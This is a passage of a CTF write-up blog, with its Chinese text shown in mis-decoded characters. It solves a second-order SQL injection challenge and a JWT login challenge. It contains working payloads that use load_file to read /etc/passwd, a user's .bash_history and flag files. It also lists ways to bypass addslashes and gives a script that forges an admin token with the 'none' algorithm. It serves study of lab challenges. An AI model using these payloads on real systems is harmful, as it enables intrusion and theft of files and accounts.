¹ç›®å½•readflagçš„å†…å®¹ç»™123å¹¶è¿è¡Œ<br>æœ€åè®¿é—® sandbox/md5(<span class="hljs-string">&quot;orange&quot;</span> .<span class="hljs-string">&quot;your_ip&quot;</span>)/123 å³å¯<br></code></pre></td></tr></table></figure><h2 id="ç½‘é¼æ¯-2018-Comment"><a href="#ç½‘é¼æ¯-2018-Comment" class="headerlink" title="[ç½‘é¼æ¯ 2018]Comment"></a>[ç½‘é¼æ¯ 2018]Comment</h2><p>å­˜åœ¨ /.git/ æºç æ³„éœ²</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br>session_start();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    header(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><div class="code-wrapper"><pre><code class="hljs">è¿™é‡Œä¿®æ”¹ä¸€ä¸‹sessionå“ï¼Œè¿™é¡µå¼€å§‹å°±å¼€å§‹ç–¯ç‹‚çš„å¤ç°äº†ï¼Œæˆ‘å°½é‡æ¯ä¸ªéƒ½è´´ä¸Šå‚è€ƒå¸ˆå‚…çš„é“¾æ¥  https://www.freesion.com/article/5996393110/è¿™é‡Œçš„ç¡®æ˜¯gitæºç æ³„éœ²ä½†æ˜¯è¿˜éœ€è¦è¿˜åŸåˆ°ä¹‹å‰çš„å†å²ç‰ˆæœ¬æ‰èƒ½çœ‹åˆ°å®Œæ•´çš„ä»£ç </code></pre></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">git log --all<br>git reset head --hard e5b2a2443c2b6d395d06960123142bc91123148c<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201251912042.png" alt="image-20220125191200885"></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201251913955.png" alt="image-20220125191301795"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br>session_start();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    header(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-variable">$category</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>    <span class="hljs-variable">$title</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>    <span class="hljs-variable">$content</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);<br>    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-variable">$bo_id</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$num</span> = mysql_num_rows(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-variable">$category</span> = mysql_fetch_array(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);<br>    &#125;<br>    header(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-subst">$bo_id</span>&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><div class="code-wrapper"><pre><code class="hljs">å¯ä»¥çœ‹åˆ° write å’Œ comment éƒ½åšäº† addslasheså¤„ç†,è¿™ä¸ªaddslashesçš„æ•°æ®å­˜å…¥åä¼šä» `\&#39; ` =&gt; `&#39;` è¿™æ ·å½“æ”»å‡»è€…å†æ¬¡ä½¿ç”¨åˆ°è¿™ä¸ªæ•°æ®çš„æ—¶å€™å°±ä¼šå‘ç”ŸäºŒæ¬¡æ³¨å…¥ã€‚</code></pre></div><p>åˆ«äººæ€»ç»“çš„ç»•è¿‡addslashesçš„æ–¹æ³•</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs subunit">è®¾ç½®æ•°æ®åº“å­—ç¬¦ä¸ºgbkå¯¼è‡´å®½å­—èŠ‚æ³¨å…¥<br>ä½¿ç”¨icon,mb_convert_encodingè½¬æ¢å­—ç¬¦ç¼–ç å‡½æ•°å¯¼è‡´å®½å­—èŠ‚æ³¨å…¥<br>urlè§£ç å¯¼è‡´ç»•è¿‡addslashes<br>base64è§£ç å¯¼è‡´ç»•è¿‡addslashes<br>jsonç¼–ç å¯¼è‡´ç»•è¿‡addslashes<br>æ²¡æœ‰ä½¿ç”¨å¼•å·ä¿æŠ¤å­—ç¬¦ä¸²ï¼Œç›´æ¥æ— è§†addslashes<br>ä½¿ç”¨äº†stripslashes(å»æ‰äº†\)<br>å­—ç¬¦æ›¿æ¢å¯¼è‡´çš„ç»•è¿‡addslashes<br>å‚è€ƒ<br>https://bbs.ichunqiu.com/thread<span class="hljs-string">-10899</span><span class="hljs-string">-1</span><span class="hljs-string">-1</span>.html<br></code></pre></td></tr></table></figure><p>å¥¥å¯¹äº†ï¼Œå¿˜äº†å†™ è´¦å· zhangwei å¯†ç  zhangwei666   è¿™ç§æ²¡å¯†ç çš„éƒ½å¯ä»¥è¯•è¯•è‡ªå·±å»ç”Ÿæˆå­—å…¸ <a href="https://www.bugku.com/mima/pass.php">https://www.bugku.com/mima/pass.php</a> </p><p>æ„é€ payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">        set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">            title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">            content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯ä¸€ä¸ªå¤šè¡Œçš„sqlè¯­å¥æ‰€ä»¥é—­åˆçš„è¯åº”è¯¥é€‰ç”¨ <code>&#39;,content=database(),/*</code>è¿™æ ·çš„å½¢å¼,æœ€ååœ¨commentå¤„ <code>*/#</code>    å¦‚ä¸‹å›¾</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201251925312.png" alt="image-20220125192508249"></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201251946557.png" alt="image-20220125194617479"></p><p>æ—¢ç„¶å¯ä»¥æ‹¼æ¥æ¶æ„è¯­å¥ å¯ä»¥ç›´æ¥ä½¿ç”¨load_fileè¯»å–æ–‡ä»¶</p><p>ç„¶åå…ˆè¯»å– /etc/passwd è¯•è¯•çœ‹  <code>1&#39;,content=(select (load_file(&#39;/etc/passwd&#39;))),/*</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201251949325.png" alt="image-20220125194922251"></p><p>å‘ç°ä¸€ä¸ª www è´¦æˆ· ç±»ä¼¼ä¸ www-data å¯¹å¤–æä¾›ç½‘ç»œæœåŠ¡ï¼Œç„¶åæ€è·¯å°±æ˜¯çœ‹ä»–çš„ .bash_historyçœ‹çœ‹å®ƒçš„å†å²æ“ä½œ</p><p><code>1&#39;,content=(select (load_file(&#39;/home/www/.bash_history&#39;))),/*</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201251951238.png" alt="image-20220125195147164"></p><p>å‘ç° DS_Store   <code>1&#39;, content=(select (load_file(&#39;/tmp/html/.DS_Store&#39;))),/*</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201251952697.png" alt="image-20220125195251611"></p><p>æ²¡æœ‰å®Œå…¨è¯»å–å‡ºæ¥ï¼Œè¿™ä¸ªæ—¶å€™å°†å†…å®¹ç¼–ç é‡æ–°è¾“å‡º  <code>1&#39;,content=(select hex(load_file(&quot;/tmp/html/.DS_Store&quot;))),/*</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201251954344.png" alt="image-20220125195453250"></p><p><code>1&#39;,content=(select hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;))),/*</code> ç„¶åè¯»å–æ–‡ä»¶å³å¯ æˆ‘ä¸çŸ¥é“å…¶ä»–äººä¸ºä»€ä¹ˆè¯´è¯»å–åˆ°å‡flagäº†</p><h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><p>å…ˆæ³¨å†Œè´¦å·</p><p>ç™»å½•ä¹‹åå‘ç° getflagæŒ‰é’®</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201252045400.png" alt="image-20220125204529297"></p><p>åŒæ—¶å‘ç° app.js å¤§æ¦‚è¯´æ˜è¿™é¢˜ç”¨çš„jså¤„ç†é€»è¾‘  ä¸‹é¢æ˜¯ä»£ç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  æˆ–è®¸è¯¥ç”¨ koa-static æ¥å¤„ç†é™æ€æ–‡ä»¶</span><br><span class="hljs-comment"> *  è·¯å¾„è¯¥æ€ä¹ˆé…ç½®ï¼Ÿä¸ç®¡äº†å…ˆå¡«ä¸ªæ ¹ç›®å½•XD</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">const</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).val();<br>    <span class="hljs-keyword">const</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).val();<br>    <span class="hljs-keyword">const</span> token = sessionStorage.getItem(<span class="hljs-string">&quot;token&quot;</span>);<br>    $.post(<span class="hljs-string">&quot;/api/login&quot;</span>, &#123;username, password, <span class="hljs-attr">authorization</span>:token&#125;)<br>        .done(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;<br>            <span class="hljs-keyword">const</span> &#123;status&#125; = data;<br>            <span class="hljs-keyword">if</span>(status) &#123;<br>                <span class="hljs-built_in">document</span>.location = <span class="hljs-string">&quot;/home&quot;</span>;<br>            &#125;<br>        &#125;)<br>        .fail(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) </span>&#123;<br>            alert(xhr.responseJSON.message);<br>        &#125;);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">const</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).val();<br>    <span class="hljs-keyword">const</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).val();<br>    $.post(<span class="hljs-string">&quot;/api/register&quot;</span>, &#123;username, password&#125;)<br>        .done(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;<br>            <span class="hljs-keyword">const</span> &#123; token &#125; = data;<br>            sessionStorage.setItem(<span class="hljs-string">&#x27;token&#x27;</span>, token);<br>            <span class="hljs-built_in">document</span>.location = <span class="hljs-string">&quot;/login&quot;</span>;<br>        &#125;)<br>        .fail(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) </span>&#123;<br>            alert(xhr.responseJSON.message);<br>        &#125;);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logout</span>(<span class="hljs-params"></span>) </span>&#123;<br>    $.get(<span class="hljs-string">&#x27;/api/logout&#x27;</span>).done(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;<br>        <span class="hljs-keyword">const</span> &#123;status&#125; = data;<br>        <span class="hljs-keyword">if</span>(status) &#123;<br>            <span class="hljs-built_in">document</span>.location = <span class="hljs-string">&#x27;/login&#x27;</span>;<br>        &#125;<br>    &#125;);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span>(<span class="hljs-params"></span>) </span>&#123;<br>    $.get(<span class="hljs-string">&#x27;/api/flag&#x27;</span>).done(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;<br>        <span class="hljs-keyword">const</span> &#123;flag&#125; = data;<br>        $(<span class="hljs-string">&quot;#username&quot;</span>).val(flag);<br>    &#125;).fail(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) </span>&#123;<br>        alert(xhr.responseJSON.message);<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹äº koaæ¡†æ¶ä¹Ÿå°±æ˜¯ä»£ç æ³¨é‡Šä¸­æåˆ°çš„ controllersç›®å½•æ˜¯é¡¹ç›®æ§åˆ¶å™¨å­˜æ”¾ç›®å½•ï¼šæ¥å—è¯·æ±‚ï¼Œå¤„ç†é€»è¾‘ï¼Œè®¿é—®url/controllers/api.jså‘ç°å¤„ç†é€»è¾‘</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>)<br><br><span class="hljs-keyword">const</span> APIError = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../rest&#x27;</span>).APIError;<br><br><span class="hljs-built_in">module</span>.exports = &#123;<br>    <span class="hljs-string">&#x27;POST /api/register&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">const</span> &#123;username, password&#125; = ctx.request.body;<br><br>        <span class="hljs-keyword">if</span>(!username || username === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> APIError(<span class="hljs-string">&#x27;register error&#x27;</span>, <span class="hljs-string">&#x27;wrong username&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">global</span>.secrets.length &gt; <span class="hljs-number">100000</span>) &#123;<br>            <span class="hljs-built_in">global</span>.secrets = [];<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> secret = crypto.randomBytes(<span class="hljs-number">18</span>).toString(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>        <span class="hljs-keyword">const</span> secretid = <span class="hljs-built_in">global</span>.secrets.length;<br>        <span class="hljs-built_in">global</span>.secrets.push(secret)<br><br>        <span class="hljs-keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);<br><br>        ctx.rest(&#123;<br>            <span class="hljs-attr">token</span>: token<br>        &#125;);<br><br>        <span class="hljs-keyword">await</span> next();<br>    &#125;,<br><br>    <span class="hljs-string">&#x27;POST /api/login&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">const</span> &#123;username, password&#125; = ctx.request.body;<br><br>        <span class="hljs-keyword">if</span>(!username || !password) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> APIError(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;username or password is necessary&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;<br><br>        <span class="hljs-keyword">const</span> sid = <span class="hljs-built_in">JSON</span>.parse(Buffer.from(token.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;base64&#x27;</span>).toString()).secretid;<br><br>        <span class="hljs-built_in">console</span>.log(sid)<br><br>        <span class="hljs-keyword">if</span>(sid === <span class="hljs-literal">undefined</span> || sid === <span class="hljs-literal">null</span> || !(sid &lt; <span class="hljs-built_in">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="hljs-number">0</span>)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> APIError(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;no such secret id&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> secret = <span class="hljs-built_in">global</span>.secrets[sid];<br><br>        <span class="hljs-keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);<br><br>        <span class="hljs-keyword">const</span> status = username === user.username &amp;&amp; password === user.password;<br><br>        <span class="hljs-keyword">if</span>(status) &#123;<br>            ctx.session.username = username;<br>        &#125;<br><br>        ctx.rest(&#123;<br>            status<br>        &#125;);<br><br>        <span class="hljs-keyword">await</span> next();<br>    &#125;,<br><br>    <span class="hljs-string">&#x27;GET /api/flag&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">if</span>(ctx.session.username !== <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> APIError(<span class="hljs-string">&#x27;permission error&#x27;</span>, <span class="hljs-string">&#x27;permission denied&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> flag = fs.readFileSync(<span class="hljs-string">&#x27;/flag&#x27;</span>).toString();<br>        ctx.rest(&#123;<br>            flag<br>        &#125;);<br><br>        <span class="hljs-keyword">await</span> next();<br>    &#125;,<br><br>    <span class="hljs-string">&#x27;GET /api/logout&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;<br>        ctx.session.username = <span class="hljs-literal">null</span>;<br>        ctx.rest(&#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-literal">true</span><br>        &#125;)<br>        <span class="hljs-keyword">await</span> next();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>å‰é¢å¼•ç”¨åº“çš„éƒ¨åˆ†ç›´æ¥è¯´æ˜äº†è€ƒç‚¹ JWT</p><p>å°±æ˜¯æ³¨å†Œæ—¶å€™ä¸èƒ½æ³¨å†Œadmin ä½†æ˜¯è·å–flagéœ€è¦adminä»¤ç‰Œï¼Œå…¶å®å°±æ˜¯æ›¿æ¢æ ¹æ®ç®—æ³•é‡æ–°ç”Ÿæˆjwtï¼Œç„¶åå°±æ˜¯adminèº«ä»½äº†</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201252109903.png" alt="image-20220125210942801"></p><p>é‡æ–°ç™»å…¥ç”¨æˆ·ï¼Œç™»å½•æ—¶æŠ“åŒ…é€‰å–authorizationéƒ¨åˆ†ï¼Œæ„å»ºè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br>token = jwt.encode(<br>&#123;<br>  <span class="hljs-string">&quot;secretid&quot;</span>: [],<br>  <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1643113661</span><br>&#125;,<br>algorithm=<span class="hljs-string">&quot;none&quot;</span>,key=<span class="hljs-string">&quot;&quot;</span><br>).encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>).decode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(token)<br><span class="hljs-comment">#eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6InRlc3QiLCJpYXQiOjE2NDMxMTM2NjF9.</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œ</p><p>ç„¶åç”¨ä¸Šé¢çš„ admin test é‡æ–°ç™»å½•ï¼Œç„¶åæ›¿æ¢authorizationå°±è¡Œ</p><h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" 